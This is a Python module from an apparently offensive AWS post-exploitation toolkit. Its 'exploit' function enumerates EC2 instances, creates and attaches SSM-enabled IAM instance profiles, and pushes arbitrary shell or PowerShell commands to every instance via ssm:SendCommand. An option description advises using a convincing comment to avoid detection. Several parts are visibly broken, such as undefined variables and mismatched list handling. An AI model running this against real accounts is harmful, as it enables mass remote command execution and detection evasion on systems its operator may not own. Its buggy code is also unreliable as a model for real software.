import botocore.exceptions
import sys
from __AMI_Images import AMIImages
from core.createSession.giveMeClient import giveMeClient
from datetime import datetime

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "ssm",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "INSTANCE-IDS": {
        "value": "All",
        "required": "false",
        "description": "The ID of the instance or several Instance IDs split by comma. Or use All. If set to All, DescribeInstances will be used to get a list of all Instances. If set to Local, it will try to get Instance-IDs from the database."
    },
    "COMMAND": {
        "value": "",
        "required": "false",
        "description": 'One command to execute on target Instances. Either use this or COMMAND-FILE.',
    },
    "COMMAND-FILE": {
        "value": "",
        "required": "false",
        "description": 'File path of a list of commands to be executed on the target instances. Either put this or COMMAND',
        "iswordlist": True
    },
    "COMMENT": {
        "value": "",
        "required": "false",
        "description": "You can leave this empty, if you don't want to run a command. Even if you run, this is not necessary, but adding a convincing comment will make it harder to detect."
    },
    "OUTPUT-S3-BUCKET-NAME": {
        "value": "",
        "required": "false",
        "description": "The name of the S3 bucket where command execution responses should be stored."
    },
    "OUTPUT-S3-BUCKET-REGION": {
        "value": "",
        "required": "false",
        "description": "The region of the S3 bucket where command execution responses should be stored."
    },
    "OUTPUT-S3-BUCKET-PREFIX": {
        "value": "",
        "required": "false",
        "description": "The directory structure within the S3 bucket where the responses should be stored."
    },
    "CHECK-FOR-INSTANCE-PROFILE": {
        "value": "False",
        "required": "true",
        "description": "The value can be True or False. If this is set to True, it will query IAM to check for Instance Profile with AmazonSSMManagedInstanceCore or AmazonEC2RoleforSSM and it's attachments."
    },
    "CREATE-INSTANCE-PROFILE": {
        "value": "False",
        "required": "true",
        "description": "The value can be True or False. If this is set to True, it will create an Instance Profile with AmazonSSMManagedInstanceCore and attach it to the inst"
    },
    "INSTANCE-PROFILE-NAME":{
        "value": "",
        "required": "false",
        "description": "The name of the Instance profile to check for. If CREATE-INSTANCE-PROFILE is set to True, it will create the instance profile with this name with AmazonSSMManagedInstanceCore permissions."
    },
	#"RUN-SEVERAL-TIMES-IF-MORE-THAN-50-INSTANCES": {
	#	"value": "",
    #    "required": "true",
    #    "description": "The value can be True or False. The number of Instances you can target is 50. If you put this "
	#				   "to True, it will call SendCommand Several Times. If not, it will only run for the first 50 "
	#				   "instances. "
	#}
}
description = "SendCommands to some InstanceIDs provided, split by comma, or a file of InstanceIDs." \
              "Also shows the output of the command if you want to." \
              "The APIs used are ssm:SendCommand and ssm:GetCommandInvocation."

'''
Have a list of Instance IDs:
	Yes:
		Yes: Is check IP True: Describe-Instances -> Find Instance IDs -> Get at least 1 IP -> get a list of instances with no IP
		No: Send-Command	
			Command Ran:
				Yes: Finish
				No: If error is no IP, tell the user
		
	No: 
		Is Instance ID All: Describe Instances -> Get Instance IDs -> Get at least 1 IP -> get a list of instances with no IP
			Have a list of instances with no IP:
				Yes: 
					Check for DB for Instance Profile with SSM or AmazonSSMManagedInstanceCore or AmazonEC2RoleforSSM
					Found IP:
		:				Yes:
							Is Create IP flag checked: Create Role. Create IP. Assoc Role to IP. Assoc IP to Instance
							No: Send status about the instances that did not have IP
						No:
							Is Check IP flag checked: 
								Run List InstanceProfile - > check for IP with SSM in name. if found:
								Yes:
									Assoc IP to Instance
							No: Send status about the instances that did not have IP
							
								
							
		Is Instance ID Local: Check DB for Instances -> Get at least 1 IP -> get a list of instances with no IP
		
	

'''



aws_command = """
aws ssm send-command --document-name <Document Name> --instance-ids <instance ID> --profile <profile>
aws ssm get-command-invocation --command-id <command ID> --instance-id <instance ID> --profile <profile>
"""

calls = [
    "DescribeInstances",
    "SendCommand",
    "ListRoles",
]

def createInstanceProfile(all_sessions, cred_prof, useragent, web_proxies, instancesWithNoIP, instances, instanceProfileName):
    if instanceProfileName == "":
        instanceProfileName = 'SSMRole'

    instanceProfile = {
                'Arn': '',
                'Name': ''
            }

    # Create the role
    try:
        iamProfile = giveMeClient(
            all_sessions,
            cred_prof,
            useragent,
            web_proxies,
            "iam"
        )
    except:
        return {"error": str(sys.exc_info())}

    assumePolicyDocument = '''{
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Effect": "Allow",
                                        "Action": [
                                            "sts:AssumeRole"
                                        ],
                                        "Principal": {
                                            "Service": [
                                                "ec2.amazonaws.com"
                                            ]
                                        }
                                    }
                                ]

                                }'''

    try:
        iamProfile.create_role(
            RoleName=instanceProfileName,
            AssumeRolePolicyDocument=assumePolicyDocument
        )
    except:
        return {"error": str(sys.exc_info())}

    # Attach Role Policy
    try:
        iamProfile = giveMeClient(
            all_sessions,
            cred_prof,
            useragent,
            web_proxies,
            "iam"
        )
    except:
        return {"error": str(sys.exc_info())}

    try:
        iamProfile.attach_role_policy(
            RoleName=instanceProfileName,
            PolicyArn='arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore'
        )
    except:
        return {"error": str(sys.exc_info())}


    # Create Instance Profile
    try:
        iamProfile = giveMeClient(
            all_sessions,
            cred_prof,
            useragent,
            web_proxies,
            "iam"
        )
    except:
        return {"error": str(sys.exc_info())}

    try:
        ip = iamProfile.create_instance_profile(
            InstanceProfileName=instanceProfileName
        )['InstanceProfile']
        instanceProfile = {
            'Arn': ip['Arn'],
            'Name': ip['InstanceProfileName']
        }
    except:
        return {"error": str(sys.exc_info())}

    # Associate Role to IP
    try:
        iamProfile = giveMeClient(
            all_sessions,
            cred_prof,
            useragent,
            web_proxies,
            "iam"
        )
    except:
        return {"error": str(sys.exc_info())}

    try:
        iamProfile.add_role_to_instance_profile(
            InstanceProfileName=instanceProfileName,
            RoleName=instanceProfileName
        )
    except:
        return {"error": str(sys.exc_info())}

    # Associate Role to IP
    try:
        ec2Profile = giveMeClient(
            all_sessions,
            cred_prof,
            useragent,
            web_proxies,
            "ec2"
        )
    except:
        return {"error": str(sys.exc_info())}

    try:
        ec2Profile.associate_iam_instance_profile(
            IamInstanceProfile=instanceProfile,
            InstanceId=instancesWithNoIP[0]
        )
        instances.append(instancesWithNoIP[0])
    except:
        return {"error": str(sys.exc_info())}

    instancesWithNoIP.remove(instancesWithNoIP[0])

    try:
        ec2Profile = giveMeClient(
            all_sessions,
            cred_prof,
            useragent,
            web_proxies,
            "ec2"
        )
    except:
        return {"error": str(sys.exc_info())}

    for instance in instancesWithNoIP:
        try:
            ec2Profile.associate_iam_instance_profile(
                IamInstanceProfile=instanceProfile,
                InstanceId=instance
            )
            instances.append(instance)
        except:
            return {"error": str(sys.exc_info())}

    return {'status': f"Instance Profile created on {str(len(instancesWithNoIP))} Instances."}

def findInstanceProfile(all_sessions, cred_prof, useragent, web_proxies, instancesWithNoIP, instances):
    iamProfile = giveMeClient(
        all_sessions,
        cred_prof,
        useragent,
        web_proxies,
        "iam"
    )

    try:
        instanceProfiles = iamProfile.list_instance_profiles()['InstanceProfiles']
        ec2Profile = giveMeClient(
            all_sessions,
            cred_prof,
            useragent,
            web_proxies,
            "ec2"
        )
        testRole = 0
        for instanceProfile in instanceProfiles:
            if "SSM" in instanceProfile['InstanceProfileName']:
                testRole = 1
                for linstancewithoutIP in instancesWithNoIP['LinuxInstances']:
                    try:
                        ec2Profile.associate_iam_instance_profile(
                            IamInstanceProfile={
                                "Arn": instanceProfile['Arn'],
                                "Name": instanceProfile['InstanceProfileName']
                            },
                            InstanceId=linstancewithoutIP
                        )
                        instances.append(linstancewithoutIP)
                    except botocore.exceptions.ClientError:
                        return {"error":"User has no access to AssociateIAMInstanceProfile"}
                for winstancewithoutIP in instancesWithNoIP['WindowsInstances']:
                    ec2Profile.associate_iam_instance_profile(
                        IamInstanceProfile={
                            "Arn": instanceProfile['Arn'],
                            "Name": instanceProfile['InstanceProfileName']
                        },
                        InstanceId=winstancewithoutIP
                    )
                    instances.append(winstancewithoutIP)
                return {"status": f"[*] Instance Profile {instanceProfile['InstanceProfileName']} was associated with "}
            else:
                print()
                '''if
                    try:

                    except:
                        return {"error": "Cannot create IAM Client"}'''

    except botocore.exceptions.ClientError:
        return {"error": "User has no rights to ListInstanceProfile"}

def sendCommandWithInstanceList(profile, instanceList, documentName, parameters):
    print()
    #for instance in instanceList:

#def exploit(profile):
def exploit(all_sessions, cred_prof, useragent, web_proxies):
    try:
        instance_ids = variables['INSTANCE-IDS']['value']
        #documentname = variables['DOCUMENT-NAME']['value']
        #documentversion = variables['DOCUMENT-VERSION']['value']
        #parameters = variables['PARAMETER-JSON']['value']
        command_file = variables['COMMAND-FILE']['value']
        command = variables['COMMAND']['value']
        #timeout = variables['TIMEOUT-SECONDS']['value']
        outputs3name = variables['OUTPUT-S3-BUCKET-NAME']['value']
        outputs3region = variables['OUTPUT-S3-BUCKET-REGION']['value']
        outputs3prefix = variables['OUTPUT-S3-BUCKET-PREFIX']['value']
        ipname = variables['INSTANCE-PROFILE-NAME']['value']
        checkForIP = variables['CREATE-PROFILE-NAME']['value']

        try:
            createIP = bool(variables['CREATE-PROFILE-NAME']['value'])
        except:
            return {"error": "CREATE-PROFILE-NAME should be either True or False."}

        try:
            checkForIP = bool(variables['CHECK-FOR-INSTANCE-PROFILE']['value'])
        except:
            return {"error": "CHECK-FOR-INSTANCE-PROFILE should be either True or False."}

        #RUN_SEVERAL_TIMES_IF_MORE_THAN_50_INSTANCES = variables['RUN-SEVERAL-TIMES-IF-MORE-THAN-50-INSTANCES']['value']

        #if not RUN_SEVERAL_TIMES_IF_MORE_THAN_50_INSTANCES.lower().strip().replace("\n", "") == "true" or \
        #   not RUN_SEVERAL_TIMES_IF_MORE_THAN_50_INSTANCES.lower().strip().replace("\n", "") == "true":
        #    return {"error": "RUN-SEVERAL-TIMES-IF-MORE-THAN-50-INSTANCES can only be True or False"}

        command_array = []

        # Check if either command or command file is provided.
        if command == "" and command_file == "":
            return {"error": "Either put COMMAND or COMMAND-FILE. Found None."}
        if not command_file == "" and command == "":
            command_array = command_file
        elif command_file == "" and not command == "":
            command_array = [command]
        else:
            return {"error": "Either put COMMAND or COMMAND-FILE. Found both."}

        completed = {
            "Completed": {
                "WindowsMachines": [],
                "LinuxMachines": []
            },
            "NotCompleted": {
                "WindowsMachines": [],
                "LinuxMachines": []
            }
        }

        args = {}
        if instance_ids == "":
            return {"error": "Either put All for all Instances, or provide one INSTANCE-ID or several INSTANCE-IDs "
                             "Separated by commas."}

        else:
            linuxInstances = []
            windowsInstances = []
            instances = []
            instancesWithNoIP = {
                "LinuxInstances": [],
                "WindowsInstances": []
            }

            ssmRoles = []

            if instance_ids == "All":
                ec2Profile = giveMeClient(all_sessions, cred_prof, useragent, web_proxies, "ec2")
                try:
                    if "error" in ec2Profile:
                        return ec2Profile
                except TypeError:
                    pass

                try:
                    instanceResponse = ec2Profile.describe_instances()['Reservations']

                    if len(instanceResponse) == 0:
                        return {"error": "There are no instances used in the account"}

                    for instance in instanceResponse:
                        for ami in AMIImages:
                            if ami['ImageId'] == instance['Instances']['ImageId']:
                                if "IamInstanceProfile" in instance['Instances']:
                                    ssmRoles.append(instance['Instances']['IamInstanceProfile'])
                                    if "Windows" in ami['PlatformDetails']:
                                        windowsInstances.append(instance['Instances']['InstanceId'])

                                    else:
                                        linuxInstances.append(instance['Instances']['InstanceId'])

                                else:
                                    if "Windows" in ami['PlatformDetails']:
                                        instancesWithNoIP['WindowsInstances'].append(instance['Instances']['InstanceId'])

                                    else:
                                        instancesWithNoIP['LinuxInstances'].append(instance['Instances']['InstanceId'])

                except botocore.exceptions.ClientError:
                    return {"error": "User has no access to DescribeInstances. Provide a list of InstanceIDs to "
                                     "continue."}
            else:
                instances = instance_ids.replace(" ", "").split(",")

            if createIP:
                if len(ssmRoles) > 0:
                    ec2Profile = giveMeClient(
                        all_sessions,
                        cred_prof,
                        useragent,
                        web_proxies,
                        "ec2"
                    )
                    for linstancewithoutIP in instancesWithNoIP['LinuxInstances']:
                        ec2Profile.associate_iam_instance_profile(
                            IamInstanceProfile=ssmRoles,
                            InstanceId=linstancewithoutIP
                        )
                        instances.append(linuxInstances)

                    for winstancewithoutIP in instancesWithNoIP['WindowsInstances']:
                        ec2Profile.associate_iam_instance_profile(
                            IamInstanceProfile=ssmRoles,
                            InstanceId=winstancewithoutIP
                        )
                        instances.append(winstancewithoutIP)
                else:
                    status = createInstanceProfile(all_sessions, cred_prof, useragent, web_proxies, instancesWithNoIP, instances, instanceProfileName)
                    if "error" in status:
                        return status
                    else:
                        completed['status'] += "\n"
                        completed['status'] += status['status']

            if not outputs3name == "":
                args['OutputS3BucketName'] = outputs3name

            if not outputs3region == "":
                args['OutputS3KeyRegion'] = outputs3region

            if not outputs3prefix == "":
                args['OutputS3KeyPrefix'] = outputs3prefix

            args['Parameters'] = {
                "commands": command_array,
                "executionTimeout": ["10"]
            }

            if len(linuxInstances) > 0:
                #Linux Instances here
                args['DocumentName'] = "AWS-RunShellScript"

                ssmProfile = giveMeClient(all_sessions, cred_prof, useragent, web_proxies, "ssm")
                print(ssmProfile)
                try:
                    if "error" in ssmProfile:
                        return ssmProfile
                except TypeError:
                    pass

                count = len(linuxInstances)
                index = 0
                while True:
                    try:
                        if (index+49) > len(linuxInstances):
                            args['InstanceIds'] = linuxInstances[index:len(instances)]
                        else:
                            args['InstanceIds'] = linuxInstances[index:index+49]

                        ssmProfile.send_command(
                            **args
                        )

                        (completed['LinuxMachines']).extend(args['InstanceIds'])
                    except ssmProfile.exceptions.InvalidDocument:
                        return {"error": "The document provided is not valid or does not exist."}

                    except ssmProfile.exceptions.TargetNotConnected:
                        return {"error": "You cannot connect to the target. Either you have an internet problem, or the target might be shutdown/removed."}

                    except:
                        return {"error": str(sys.exc_info())}
                        #allinst.append(f"Error on Instance '{instance}': {str(sys.exc_info())}")

                    count -= 50
                    index += 50
                    if count <= 0:
                        break



            if len(windowsInstances) > 0:
                # Windows Instances
                args['DocumentName'] = "AWS-RunPowerShellScript"

                ssmProfile = giveMeClient(all_sessions, cred_prof, useragent, web_proxies, "ssm")

                try:
                    if "error" in ssmProfile:
                        return ssmProfile
                except TypeError:
                    pass

                count = len(instances)
                index = 0
                while True:
                    try:
                        if (index+49) > len(instances):
                            args['InstanceIds'] = instances[index:len(instances)]
                        else:
                            args['InstanceIds'] = instances[index:index+49]

                        ssmProfile.send_command(
                            **args
                        )
                        #allinst.append(f"Command was successful on Instance '{instance}'")
                        (completed['WindowsMachines']).extend(args['InstanceIds'])
                    except ssmProfile.exceptions.InvalidDocument:
                        return {"error": "The document provided is not valid or does not exist."}

                    except ssmProfile.exceptions.TargetNotConnected:
                        return {"error": "You cannot connect to the target. Either you have an internet problem, or the target might be shutdown/removed."}

                    except:
                        return {"error": str(sys.exc_info())}
                        #allinst.append(f"Error on Instance '{instance}': {str(sys.exc_info())}")

                    count -= 50
                    index += 50
                    if count <= 0:
                        break

            return {"Status": completed}
    except:
        return {"error": str(sys.exc_info())}

